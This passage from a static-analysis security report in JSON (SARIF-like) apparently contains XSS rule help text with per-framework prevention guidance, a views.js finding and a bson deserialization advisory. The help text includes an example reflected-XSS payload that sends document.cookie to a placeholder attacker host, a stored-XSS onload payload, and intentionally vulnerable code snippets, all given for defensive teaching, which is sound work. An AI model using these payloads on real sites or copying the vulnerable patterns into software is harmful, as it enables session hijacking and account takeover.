\n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache \n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework for that purpose.\n\n:::\n\n:::tab[Angular]\n\n## XSS Protection in Angular\n\nAngular is safe by default and escapes all dynamic values automatically. The\nexception are the `bypassSecurityTrust*` functions in the `DomSanitizer` object.\nCarefully audit every use of these functions to make sure they are not used with\nuntrusted input.\n\nUsing these functions with untrusted data immediately opens the door to XSS\nattacks:\n\n```typescript\nimport { Component, OnInit } from '@angular/core';\nimport {DomSanitizer} from '@angular/platform-browser'\n\n@Component({\n  selector: 'component-with-dom-sanitizer',\n  template: '<div [innerHTML]=\"html\"></div>', // include HTML content from 'this.html'\n})\nexport class ComponentWithDomSanitizer implements OnInit {\n  html: SafeHtml;\n\n  constructor(private sanitizer: DomSanitizer) {}\n\n  ngOnInit(): void {\n    // never use with untrusted/partially trusted input!\n    // if you are uncertain, prefer this.sanitizer.sanitize()\n    this.html = this.sanitizer.bypassSecurityTrustHtml('<img src=\"broken\" onerror=\"alert(\\'Hello XSS!\\')\">') ;\n  }\n}\n```\n\n:::\n\n:::tab[C#]\n\n## XSS Protection in C#\n\nThe Razor template language escapes dynamic content automatically when using the @ symbol for interpolation. The following snippet writes out the untrusted input as `&lt;&quot;script&quot;&gt;` when rendering the HTML, safely defusing any\npotential XSS attacks:\n\n```html\n@{\n    var untrustedInput = \"<\\\"script\\\">\";\n}\n\n<h1>@untrustedInput</h1>\n```\n\nThis can be overridden using the `Html.Raw()` method - opening up the possibility of XSS attacks:\n\n```html\n<!-- this is vulnerable to XSS -->\n<div data-url=\"@Html.Raw(untrustedInput)\"></div>\n```\n\nCarefully audit every use of `Html.Raw()` to make sure it is not used with untrusted data.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. One option for this is the `System.Web.HttpUtility.HtmlEncode()` method.\n\n:::\n\n:::tab[Go]\n\n## XSS Protection in Go\n\nThe `html/template` package is safe by default, automatically escaping dynamic content. For example, the following snippet:\n\n```go\nimport \"html/template\"\n\nt, err := template.New(\"template\").Parse(`{{define \"T\"}}Hello, {{.}}!{{end}}`)\nerr = t.ExecuteTemplate(out, \"T\", \"<script>alert('Hacked!')</script>\")\n```\n\n...writes escaped HTML to the `out` variable. This is in contrast to the `text/template` package which does not provide\nsuch protection.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. You can use the `html/template.HTMLEscapeString()` function\nfor this.\n\n:::\n\n:::tab[JavaScript]\n\n## XSS Protection in JavaScript\n\nMany template languages escape dynamic content by default, unless you add a directive telling them not to. For instance,\nthe Nunjucks\ntemplate language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nThis behavior can be overridden, however, creating the possibility of vulnerabilities. In Nunjucks, one way\nof doing this are by using the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way such templates become vulnerable is when HTML-escaping is disabled globally:\n\n```javascript\n// bad: this asks for your app to be vulnerable to XSS attacks\nnunjucks.configure({ autoescape: false });\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent manually. One way of doing this by using the `escape-html` Node module:\n\n```javascript\nconst escape = require('escape-html')\nconst html   = escape('<script>')     // Will return &lt;script&gt;\n```\n\n:::\n\n:::tab[Python]\n\n## XSS Protection in Python\n\nMost Python template languages escape dynamic content by default unless you add a directive telling them not to. For instance,\nJinja2 template language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nTemplate languages allow this behavior to be overridden, however, which can create an XSS vulnerability. In Jinja2, this is done with the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way your templates can become vulnerable is by adding the `{% autoescape false %}` directive, which disables escaping for the whole template. Avoid using it.\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings, you are responsible for escaping any\ndynamic content possibly coming from an untrusted source. In Python, the builtin `html` module provides the `escape()` function for this purpose:\n\n```python\nimport html\n\n# Will return &lt;script%gt;\nhtml.escape(\"<script>\")\n```\n\n:::\n\n:::tab[React]\n\n## XSS Protection in React\n\nBy default, React escapes any dynamic content you use to construct elements. For example, if some malicious\nJavaScript is passed in the malicious query string parameter, the following snippet is *still* safe:\n\n```jsx\nimport useSearchParams from 'react-router-dom'\n\nfunction SearchBar() {\n  const [searchParams, setSearch] = useSearchParams();\n  const searchParam = searchParams.get(\"search\");\n  \n  return (\n    <input type=\"text\" value={search} onChange={updateSearch} className=\"search-bar\" />\n  );\n}\n```\n\nTo disable auto-escaping in React, you would use the property `dangerouslySetInnerHTML`. Only use this with fully trusted or already HTML-escaped data, or your application is vulnerable to XSS attacks.\n\n```jsx\n<div className=\"search-bar\">\n  <!-- vulnerable! -->\n  <div dangerouslySetInnerHTML={{ __html: searchParam }}>\n  </div>\n</div>\n```\n\n\n:::\n\n:::tab[Scala]\n\n## XSS Protection in Scala\n\nMost template languages in Scala escape dynamic content by default. The popular Play framework escapes dynamic\ncontent by default when you use the following form:\n\n```html\n<p>\n  @(article.content)\n</p>\n```\n\nYou can opt out of this protection by using `@Html()`. Due to the dangers of XSS vulnerabilities, carefully audit every use to ensure the data comes from a trusted source or is HTML-escaped in another step.\n\n```html\n<p>\n  <!-- dangerous! -->\n  @Html(article.content)\n</p>\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent before you write it to the output stream. If you use the play framework you can use the `play.api.templates.HtmlFormat.escape()` method for this. Other options are the\n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache\n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework.\n\n\n:::\n\n:::tab[PHP]\n\n## XSS Protection in PHP\n\nIn PHP, HTML is not escaped by default, making it susceptible to Cross-Site Scripting attacks if proper measures are not taken. Below is a simple example demonstrating how one might inadvertently allow for XSS:\n\n```php\n<?php\n$userName = $_GET['username'];\n?>\n<h1>Hello, <?=$userName?></h1> <!-- bad: users can inject HTML or JavaScript here -->\n```\n\nBy directly echoing user input, you expose yourself to potential XSS vulnerabilities. A common string to show that an attack is possible is: `<script>alert('XSS!');</script>`\n\n### Mitigation\n\nIdeally, use a templating engine or frontend framework that protect against XSS by default by requiring special syntax for raw HTML output. The builtin PHP templating has no such protections, but for example the Blade template engine from Laravel does.\n\nWhen you are dealing with legacy code that uses a template engine with insecure defaults, you must remember to manually escape any output that could potentially contain user-controlled data. This is highly discouraged because it is so easy to forget, or overlook an obscure way that attacker-controlled inputs can actually end up in dynamic output. Still, if you have to do it, the most basic way to do this in PHP is using the built-in `htmlspecialchars` function:\n\n```php\n<?php\n$userName = $_GET['username'];\n$safeUserName = htmlspecialchars($userName, ENT_QUOTES, 'UTF-8');\n?>\n<h1>Hello, <?=$safeUserName?></h1> <!-- safe: characters like < and > are converted to their HTML entities -->\n```\n\nBy using `htmlspecialchars`, the input string is made safe for displaying in HTML by converting characters like `<` and `>` into their respective HTML entities (`&lt;` and `&gt;`), preventing them from being interpreted as HTML or JavaScript by the browser.\n\nHowever, ensure you always use `htmlspecialchars` or similar functions whenever you're outputting data that might contain user input, not just in this specific context. Also, use context-aware output functions when working with JavaScript, CSS, or URL parameters to prevent XSS in those contexts.\n\nRemember, avoiding XSS is not only about protecting against `<script>` tags, but also about preventing attackers from manipulating HTML in ways that can lead to data theft, defacement, or other malicious activities.\n\n:::\n\n::::\n\n## CWEs\n\n* [CWE-79](https://cwe.mitre.org/data/definitions/79.html)",
                                "text": "This HTML content is not a string literal. When unescaped attacker-controlled inputs are used as part of HTML content this indicates a Cross-Site Scripting vulnerability.\n\n# Cross-Site Scripting\n\nA **Cross-site scripting** (XSS) vulnerability allows an attacker to execute\nJavaScript code in an HTML document rendered by a victim. As a result, the\nattacker can then for example impersonate the victim user to perform arbitrary actions\nprovided by the web application, or exfiltrate and modify sensitive data that is otherwise only accessible to the victim.\n\n## Anatomy of an XSS Attack\n\nThe nature of web applications requires them to process and handle HTML content, which often dynamically incorporates external data. Applications must correctly escape or sanitize all such dynamic content to prevent **XSS attacks**. The most common types of XSS vulnerabilities are:\n\n### Reflected XSS\n\nReflected Cross-Site scripting attack happens in multiple steps:\n\n1. An attacker gets a victim to send data of the attacker's choosing to a website - for example by redirecting them to a URL of\n   the attacker's choosing.\n2. The application includes this untrusted data in an HTML document it sends in response (*reflecting* the data), without taking correct steps to disarm it.\n3. The victim's browser executes JavaScript code of the attacker's choosing.\n\nAs an example let's take a web application that displays the contents of the `search` query parameter in the URL. When an attacker sends a link to a victim to get them to visit a URL like\n\n    https://your-website.invalid/?search=<script>location.href=\"https://attacker-owned.invalid/?\"+document.cookie</script>\n\nIf the HTML response contains this `<script>` tag as-is and the victim clicks on the link, the victim's browser executes this JavaScript code. The JavaScript snippet in this example sends the victim's cookies on your website back to the attacker - on many sites that allows the attacker to take over the active log-in of the victim and impersonate them.\n\n\n### Stored XSS\n\nA Stored Cross-Site Scripting vulnerability happens when the following things come together:\n\n1. An application persists / stores untrusted data, for example in a database. An attacker gets the application to store some HTML and JavaScript code.\n2. The application later retrieves this stored data and includes it as part of an HTML document. (And the application does not take correct steps to disarm the attacker-controlled data.)\n3. A victim views such an HTML page. Their browser executes the attacker-chosen JavaScript code.\n\nFor example, a social-network type website may allow users to set the avatar that is displayed next to their name on their profile or next to their posts to an arbitrary URL of an image file. This website stores this URL in a database and includes the URL as-is in an HTML tag `<img src=\"...\">`. An attacker with user-id `1337` specifies this URL for their avatar:\n\n    https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\n\nto get the application to generate this resulting HTML code:\n\n```html\n<img src=\"https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\">\n```\n\nWhenever someone looks at the profile of the attacker, their browser executes the JavaScript code that adds the attacker to the victim's friend list without further user interaction.\n\n\n### DOM-Based XSS\n\nWith **DOM-based XSS vulnerabilities** the HTML code that is generated in the backend is safe by itself. Instead, the vulnerability is in JavaScript frontend code that inserts untrusted data into the browser **Document Object Model** (DOM) in an insecure manner.\n\nA **DOM-based XSS vulnerability** can be either **reflected** or **stored** - depending on how the untrusted data is transmitted by an attacker.\n\nWe can revisit the social-network example for **stored XSS** - a site that uses a JavaScript snippet like this would be vulnerable to the same attack:\n\n```javascript\n$.get(\"user/1337/profile\", res => $(\"#avatar\").html(`<img src=\"${res.avatarURL}\">`));\n```\n\n(This snippet performs an HTTP GET request to request the user's profile information. It insecurely includes the result when rendering a snippet of HTML.)\n\n### Cross-Site Scripting Beside the Web\n\nApplications that are not websites at all still often use HTML (or related technologies that are also susceptible to XSS) to display formatted text to users - whether they are mobile applications, desktop applications or embedded. These applications must be just as careful when including dynamic data in the HTML they generate.\n\nIn fact, the impact of an XSS attack against such applications is often even more disastrous. The HTML views such applications use are generally not meant to protect the application or user against malicious JavaScript. Instead, they have powerful non-standard JavaScript APIs that can allow an attacker to take complete control of the application and computer.\n\nThere are endless potential scenarios for such problems. Here are some examples to spark your imagination:\n\n- a messenger app executing scripts within messages from other users\n- an ebook reader executing JavaScript from code samples in a book about JavaScript\n- a Wi-Fi network selection list names executing scripts from the name of access points\n\nThe root problem is the same as for websites - whenever you include dynamic content in HTML and the source of this dynamic data cannot be trusted 100%, XSS attacks can happen. And on the flip-side, the same techniques and best practices protect against such vulnerabilities.\n\n## Preventing XSS Attacks\n\nThere are multiple approaches to prevent XSS attacks.\n\nBest practice is to use **secure-by-default web frameworks and templating engines** for generating or modifying HTML. For these you only need to think about the possibility of a XSS vulnerability because data is not fully trusted in the places where explicitly output raw HTML.\n\nThe next-best option is to manually HTML-**escape** all dynamic data that you include in an HTML document. This approach is secure in principle but has several downsides:\n\n- it is easy to forget to escape some untrusted data - even if you remember to do it correctly *almost* everywhere\n- untrusted inputs can take very long-winded paths before getting output again - a developer just needs to overlook one such path to fool themselves to think escaping is not needed when it actually is\n- it violates the don't-repeat-yourself (DRY) principle, requiring boilerplate code in every place an application adds dynamic data to HTML content\n\nWhen you decide to use escaping, be wary of when you escape data from untrusted inputs: subsequent encoding, decoding or other text manipulation operations on already-escaped strings can inadvertently reintroduce some way for an attacker to thwart the protection from that earlier HTML-escaping operation - it is therefore generally best to wait until the last possible moment to do HTML-escaping.\n\nSometimes you have text that is not fully trusted and is already in HTML format. The previous options do not work in that case. Instead, you need to **sanitize** the HTML so that benign HTML formatting is passed through but nothing that can be abused by an attacker. This should be an **option of last resort**. Attackers regularly come up with novel ways to render sanitization useless. If you do go with it, we have a few tips:\n\n- Use a well-known HTML sanitization library! There are many non-obvious ways HTML can contain JavaScript code. Do not believe you know and remember of all of them.\n- Rigorously keep up with updates for the HTML sanitizer you use! Updates will often fix ways attackers can bypass the sanitization, or add support for some new browser features that in some way can lead to JavaScript execution.\n- Be as restrictive as possible! HTML sanitization libraries can generally be configured as to which HTML constructs should be allowed and which should not. Give attackers as little wiggle-room to find a way around the sanitization as possible.\n- Use mitigations for Cross-Site Scripting from the next section.\n\n\n## Mitigating Cross-Site Scripting Attacks\n\nThere are several things you can do to lower the impact of XSS vulnerabilities but not quite to the point of solving the problem completely. You should not rely on them as sole protection, yet they are a useful defense-in-depth measure in case something goes wrong.\n\nYou can use the `Content-Security-Policy` (CSP) HTTP header to instruct browsers not to execute JavaScript code except in places you explicitly allow. A restrictive **Content Security Policy** is effective in stopping XSS attacks in otherwise vulnerable websites. But sufficiently restrictive policies also disable many useful features of the web platform. As a result, policies seen in practice often still allow some subset of attacks to go through. Try to remain as strict as possible in what you allow in your **content security policies**.\n\nWhen you know you show HTML content to users that you do not fully trust (e.g. you used sanitization or sourced it from a partner company), consider loading it within an `<iframe>` with the `sandbox` attribute. This attribute allows you to instruct the browser to disable various dangerous features and allows you to limit the ways content inside the **sandbox** can interact with your regular site. \n\nXSS filters in browsers, middleware or application firewalls have severe limitations. They can provide some protection against well-known exploits in off-the-shelf software. But attackers regularly find ways to bypass these tools. Most browsers have removed or never implemented builtin XSS filters because there actually are cases where they create vulnerabilities in sites that are otherwise secure. Similar problems fundamentally also apply to server-side filters when they don't just block possible exploit attempts but are supposed to neutralize them.\n\n\n::::tabs\n\n:::tab[Java]\n\n## XSS Protection in JSP\n\nJava Server Pages (JSP) do **not** protect against Cross-Site Scripting by default. The following example is vulnerable to XSS attacks if users can freely choose their names:\n\n```html\n<h1>Hello, ${user.name}</h1><!-- bad: users can inject HTML code here -->\n```\n\nInstead, in JSP you must use one of these two more verbose ways to output dynamic data in order to prevent XSS attacks:\n\n```html\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/core\" prefix=\"c\" %>\n<h1>Hello, <c:out value=\"${user.name}\"/></h1>\n```\n\n```html\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/functions\" prefix=\"fn\" %>\n<h1>Hello, ${fn:escapeXml(user.name)}</h1>\n```\n\nNote that a lot of information from the JSP and servlet context is attacker-controlled, so don't forget to escape this data.\n\n## XSS Protection in Regular Java\n\nIf your code manually constructs HTML (e.g. in a servlet) you need to escape any dynamic content before writing it. For example, you may use \n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache \n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework for that purpose.\n\n:::\n\n:::tab[Angular]\n\n## XSS Protection in Angular\n\nAngular is safe by default and escapes all dynamic values automatically. The\nexception are the `bypassSecurityTrust*` functions in the `DomSanitizer` object.\nCarefully audit every use of these functions to make sure they are not used with\nuntrusted input.\n\nUsing these functions with untrusted data immediately opens the door to XSS\nattacks:\n\n```typescript\nimport { Component, OnInit } from '@angular/core';\nimport {DomSanitizer} from '@angular/platform-browser'\n\n@Component({\n  selector: 'component-with-dom-sanitizer',\n  template: '<div [innerHTML]=\"html\"></div>', // include HTML content from 'this.html'\n})\nexport class ComponentWithDomSanitizer implements OnInit {\n  html: SafeHtml;\n\n  constructor(private sanitizer: DomSanitizer) {}\n\n  ngOnInit(): void {\n    // never use with untrusted/partially trusted input!\n    // if you are uncertain, prefer this.sanitizer.sanitize()\n    this.html = this.sanitizer.bypassSecurityTrustHtml('<img src=\"broken\" onerror=\"alert(\\'Hello XSS!\\')\">') ;\n  }\n}\n```\n\n:::\n\n:::tab[C#]\n\n## XSS Protection in C#\n\nThe Razor template language escapes dynamic content automatically when using the @ symbol for interpolation. The following snippet writes out the untrusted input as `&lt;&quot;script&quot;&gt;` when rendering the HTML, safely defusing any\npotential XSS attacks:\n\n```html\n@{\n    var untrustedInput = \"<\\\"script\\\">\";\n}\n\n<h1>@untrustedInput</h1>\n```\n\nThis can be overridden using the `Html.Raw()` method - opening up the possibility of XSS attacks:\n\n```html\n<!-- this is vulnerable to XSS -->\n<div data-url=\"@Html.Raw(untrustedInput)\"></div>\n```\n\nCarefully audit every use of `Html.Raw()` to make sure it is not used with untrusted data.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. One option for this is the `System.Web.HttpUtility.HtmlEncode()` method.\n\n:::\n\n:::tab[Go]\n\n## XSS Protection in Go\n\nThe `html/template` package is safe by default, automatically escaping dynamic content. For example, the following snippet:\n\n```go\nimport \"html/template\"\n\nt, err := template.New(\"template\").Parse(`{{define \"T\"}}Hello, {{.}}!{{end}}`)\nerr = t.ExecuteTemplate(out, \"T\", \"<script>alert('Hacked!')</script>\")\n```\n\n...writes escaped HTML to the `out` variable. This is in contrast to the `text/template` package which does not provide\nsuch protection.\n\n### Manual Escaping\n\nIf you are constructing HTML outside a template you must remember to manually\nHTML-escape dynamic data. You can use the `html/template.HTMLEscapeString()` function\nfor this.\n\n:::\n\n:::tab[JavaScript]\n\n## XSS Protection in JavaScript\n\nMany template languages escape dynamic content by default, unless you add a directive telling them not to. For instance,\nthe Nunjucks\ntemplate language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nThis behavior can be overridden, however, creating the possibility of vulnerabilities. In Nunjucks, one way\nof doing this are by using the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way such templates become vulnerable is when HTML-escaping is disabled globally:\n\n```javascript\n// bad: this asks for your app to be vulnerable to XSS attacks\nnunjucks.configure({ autoescape: false });\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent manually. One way of doing this by using the `escape-html` Node module:\n\n```javascript\nconst escape = require('escape-html')\nconst html   = escape('<script>')     // Will return &lt;script&gt;\n```\n\n:::\n\n:::tab[Python]\n\n## XSS Protection in Python\n\nMost Python template languages escape dynamic content by default unless you add a directive telling them not to. For instance,\nJinja2 template language automatically escapes anything between curly braces:\n\n```\n<!-- Will print &lt;script&gt; in the HTML. -->\n{{ \"<script>\" }}\n```\n\nTemplate languages allow this behavior to be overridden, however, which can create an XSS vulnerability. In Jinja2, this is done with the `safe` keyword (which tells the template engine you consider the source trustworthy):\n\n```\n<!-- Will print <script> in the HTML, which is not safe! -->\n{{ \"<script>\" | safe }}\n```\n\nAnother way your templates can become vulnerable is by adding the `{% autoescape false %}` directive, which disables escaping for the whole template. Avoid using it.\n\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings, you are responsible for escaping any\ndynamic content possibly coming from an untrusted source. In Python, the builtin `html` module provides the `escape()` function for this purpose:\n\n```python\nimport html\n\n# Will return &lt;script%gt;\nhtml.escape(\"<script>\")\n```\n\n:::\n\n:::tab[React]\n\n## XSS Protection in React\n\nBy default, React escapes any dynamic content you use to construct elements. For example, if some malicious\nJavaScript is passed in the malicious query string parameter, the following snippet is *still* safe:\n\n```jsx\nimport useSearchParams from 'react-router-dom'\n\nfunction SearchBar() {\n  const [searchParams, setSearch] = useSearchParams();\n  const searchParam = searchParams.get(\"search\");\n  \n  return (\n    <input type=\"text\" value={search} onChange={updateSearch} className=\"search-bar\" />\n  );\n}\n```\n\nTo disable auto-escaping in React, you would use the property `dangerouslySetInnerHTML`. Only use this with fully trusted or already HTML-escaped data, or your application is vulnerable to XSS attacks.\n\n```jsx\n<div className=\"search-bar\">\n  <!-- vulnerable! -->\n  <div dangerouslySetInnerHTML={{ __html: searchParam }}>\n  </div>\n</div>\n```\n\n\n:::\n\n:::tab[Scala]\n\n## XSS Protection in Scala\n\nMost template languages in Scala escape dynamic content by default. The popular Play framework escapes dynamic\ncontent by default when you use the following form:\n\n```html\n<p>\n  @(article.content)\n</p>\n```\n\nYou can opt out of this protection by using `@Html()`. Due to the dangers of XSS vulnerabilities, carefully audit every use to ensure the data comes from a trusted source or is HTML-escaped in another step.\n\n```html\n<p>\n  <!-- dangerous! -->\n  @Html(article.content)\n</p>\n```\n\n### Manual Escaping\n\nIf your code manually constructs HTML strings you need to escape any dynamic\ncontent before you write it to the output stream. If you use the play framework you can use the `play.api.templates.HtmlFormat.escape()` method for this. Other options are the\n`org.apache.commons.lang.StringEscapeUtils.escapeHtml()` method from the Apache\n`commons-lang` library or the `org.springframework.web.util.HtmlUtils` class from the Spring framework.\n\n\n:::\n\n:::tab[PHP]\n\n## XSS Protection in PHP\n\nIn PHP, HTML is not escaped by default, making it susceptible to Cross-Site Scripting attacks if proper measures are not taken. Below is a simple example demonstrating how one might inadvertently allow for XSS:\n\n```php\n<?php\n$userName = $_GET['username'];\n?>\n<h1>Hello, <?=$userName?></h1> <!-- bad: users can inject HTML or JavaScript here -->\n```\n\nBy directly echoing user input, you expose yourself to potential XSS vulnerabilities. A common string to show that an attack is possible is: `<script>alert('XSS!');</script>`\n\n### Mitigation\n\nIdeally, use a templating engine or frontend framework that protect against XSS by default by requiring special syntax for raw HTML output. The builtin PHP templating has no such protections, but for example the Blade template engine from Laravel does.\n\nWhen you are dealing with legacy code that uses a template engine with insecure defaults, you must remember to manually escape any output that could potentially contain user-controlled data. This is highly discouraged because it is so easy to forget, or overlook an obscure way that attacker-controlled inputs can actually end up in dynamic output. Still, if you have to do it, the most basic way to do this in PHP is using the built-in `htmlspecialchars` function:\n\n```php\n<?php\n$userName = $_GET['username'];\n$safeUserName = htmlspecialchars($userName, ENT_QUOTES, 'UTF-8');\n?>\n<h1>Hello, <?=$safeUserName?></h1> <!-- safe: characters like < and > are converted to their HTML entities -->\n```\n\nBy using `htmlspecialchars`, the input string is made safe for displaying in HTML by converting characters like `<` and `>` into their respective HTML entities (`&lt;` and `&gt;`), preventing them from being interpreted as HTML or JavaScript by the browser.\n\nHowever, ensure you always use `htmlspecialchars` or similar functions whenever you're outputting data that might contain user input, not just in this specific context. Also, use context-aware output functions when working with JavaScript, CSS, or URL parameters to prevent XSS in those contexts.\n\nRemember, avoiding XSS is not only about protecting against `<script>` tags, but also about preventing attackers from manipulating HTML in ways that can lead to data theft, defacement, or other malicious activities.\n\n:::\n\n::::\n\n## CWEs\n\n* [CWE-79](https://cwe.mitre.org/data/definitions/79.html)"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/79.html",
                            "id": "warning-sink-html/a229495bcdbbc908d55189ad7254b387",
                            "name": "Cross-Site Scripting: Non-Constant Html Content In Views.js:<Lambda>0.<Lambda>1",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "8",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 8",
                                    "CWE 79",
                                    "Cross-Site Scripting",
                                    "OWASP 2021 a03-injection",
                                    "OWASP a03-2021-injection",
                                    "OWASP a7-xss"
                                ]
                            },
                            "shortDescription": {
                                "text": "Cross-Site Scripting: Non-Constant HTML Content in views.js:<lambda>0.<lambda>1"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "bson is vulnerable to Deserialization of Untrusted Data. The package will ignore an unknown value for an object's `_bsotype`, leading to cases where an object is serialized as a document rather than the intended BSON type."
                            },
                            "help": {
                                "markdown": "bson is vulnerable to Deserialization of Untrusted Data. The package will ignore an unknown value for an object's `_bsotype`, leading to cases where an object is serialized as a document rather than the intended BSON type.",
                                "text": "bson is vulnerable to Deserialization of Untrusted Data. The package will ignore an unknown value for an object's `_bsotype`, leading to cases where an object is serialized as a document rather than the intended BSON type."
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/1035.html",
                            "id": "oss_vuln/3a5e97a5b8b9c7cc888cda3dd75156a3",
                            "name": "Pkg:npm/Bson@1.1.1",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "9.8",
                                "tags": [
                                    "ng-sast",
                                    "CVE-2020-7610",
                                    "CVSS 9.8",
                                    "CWE 1035",
                                    "CWE 502",
                                    "CWE 937",
                                    "No exploits",
                                    "Unreachable"
                                ]
                            },
                            "shortDescription": {
                                "text": "pkg:npm/bson@1.1.1"
                            }
                        }
                    ],
                    "version": "1.0.0"
                }
            }
        }
    ],
    "inlineExternalProperties": [
        {
            "guid": "264eb0d6-8035-4693-82f3-817d06e81a8e",
            "runGuid": "73e91624-892a-4b9c-a7aa-382c30b064af"
        }
    ],
    "properties": {}
}